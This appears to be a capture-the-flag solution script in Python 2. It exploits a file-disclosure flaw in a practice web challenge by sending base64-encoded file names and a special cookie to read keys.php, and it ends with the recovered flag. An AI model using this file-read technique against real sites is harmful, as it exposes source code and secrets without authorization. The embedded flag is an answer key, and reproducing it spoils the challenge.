#encoding=UTF-8

import requests
import base64

url='http://120.24.86.145:8002/web11/index.php'

s=requests.Session()

'''
with open('C:/Users/admin/Desktop/cookie.txt', 'w') as fo:
	for i in range(0,20):
		payload={
			'filename':'aW5kZXgucGhw',
			'line':str(i)
		}
		r=s.get(url,params=payload)
		#print r.text
		fo.write(r.text)
'''
keystxt=base64.b64encode('keys.txt')
print keystxt+'\r\n'
indexphp=base64.b64encode('index.php')
print indexphp+'\r\n'
keysphp=base64.b64encode('keys.php')
print keysphp+'\r\n'
'''
a2V5cy50eHQ=
aW5kZXgucGhw
a2V5cy5waHA=
'''

cookie={'margin':'margin'}
para={
		'filename':'a2V5cy5waHA=',
		'line':''
	}
r=s.get(url,cookies=cookie,params=para)
print r.text
#<?php $key='KEY{key_keys}'; ?>